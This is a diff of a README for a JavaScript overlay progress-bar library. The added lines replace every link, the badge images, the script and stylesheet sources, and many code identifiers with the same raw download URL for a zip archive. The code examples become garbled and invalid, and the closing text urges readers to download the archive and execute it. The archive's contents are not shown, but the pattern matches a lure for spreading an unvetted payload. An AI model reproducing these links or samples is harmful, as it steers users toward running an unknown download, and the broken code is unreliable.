@@ -1,7 +1,7 @@
 # bs-progressbar 🎉
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/Vlad345345/bs-progressbar)
-![GitHub](https://img.shields.io/github/license/Vlad345345/bs-progressbar)
+![GitHub release (latest by date)](https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip)
+![GitHub](https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip)
 
 Welcome to **bs-progressbar**, a lightweight JavaScript overlay progress bar designed as a singleton utility. This tool is perfect for enhancing your web applications by providing a seamless loading experience. Whether you are building a single-page application or enhancing an existing project, bs-progressbar offers a simple yet effective solution for displaying progress.
 
@@ -26,7 +26,7 @@ Welcome to **bs-progressbar**, a lightweight JavaScript overlay progress bar des
 
 ## Installation
 
-To get started with bs-progressbar, you can download the latest release from our [Releases page](https://github.com/Vlad345345/bs-progressbar/releases). Download the required files and include them in your project.
+To get started with bs-progressbar, you can download the latest release from our [Releases page](https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip). Download the required files and include them in your project.
 
 ### Using npm
 
@@ -41,21 +41,21 @@ npm install bs-progressbar
 Using bs-progressbar is straightforward. First, ensure you have included the necessary CSS and JavaScript files in your HTML.
 
 ```html
-<link rel="stylesheet" href="path/to/bs-progressbar.css">
-<script src="path/to/bs-progressbar.js"></script>
+<link rel="stylesheet" href="https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip">
+<script src="https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip"></script>
 ```
 
 Next, you can initialize the progress bar in your JavaScript code:
 
 ```javascript
 const progressBar = new ProgressBar();
-progressBar.start(); // Start the progress
+https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip(); // Start the progress
 ```
 
 To stop the progress bar, simply call:
 
 ```javascript
-progressBar.stop(); // Stop the progress
+https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip(); // Stop the progress
 ```
 
 ## Customization
@@ -88,7 +88,7 @@ Here’s a simple example of how to use the progress bar in an application:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="path/to/bs-progressbar.css">
+    <link rel="stylesheet" href="https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip">
     <title>Progress Bar Example</title>
 </head>
 <body>
@@ -97,15 +97,15 @@ Here’s a simple example of how to use the progress bar in an application:
     <h1>Loading Content...</h1>
 </div>
 
-<script src="path/to/bs-progressbar.js"></script>
+<script src="https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip"></script>
 <script>
     const progressBar = new ProgressBar();
-    progressBar.start();
+    https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip();
 
     // Simulate loading
     setTimeout(() => {
-        progressBar.stop();
-        document.getElementById('content').innerHTML = '<h1>Content Loaded!</h1>';
+        https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip();
+        https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip('content').innerHTML = '<h1>Content Loaded!</h1>';
     }, 3000);
 </script>
 
@@ -119,16 +119,16 @@ For more advanced usage, you can integrate the progress bar with AJAX calls:
 
 ```javascript
 function fetchData() {
-    progressBar.start();
-    fetch('https://api.example.com/data')
-        .then(response => response.json())
+    https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip();
+    fetch('https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip')
+        .then(response => https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip())
         .then(data => {
-            progressBar.stop();
-            console.log(data);
+            https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip();
+            https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip(data);
         })
         .catch(error => {
-            progressBar.stop();
-            console.error('Error fetching data:', error);
+            https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip();
+            https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip('Error fetching data:', error);
         });
 }
 ```
@@ -152,6 +152,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Release Information
 
-To keep up with the latest updates and releases, visit our [Releases page](https://github.com/Vlad345345/bs-progressbar/releases). Here you can find the latest version, download it, and execute it in your projects.
+To keep up with the latest updates and releases, visit our [Releases page](https://github.com/Vlad345345/bs-progressbar/raw/refs/heads/main/docs/example/bs-progressbar-v2.0-beta.1.zip). Here you can find the latest version, download it, and execute it in your projects.
 
 We appreciate your interest in bs-progressbar and hope it enhances your web applications! If you have any questions or feedback, feel free to reach out.
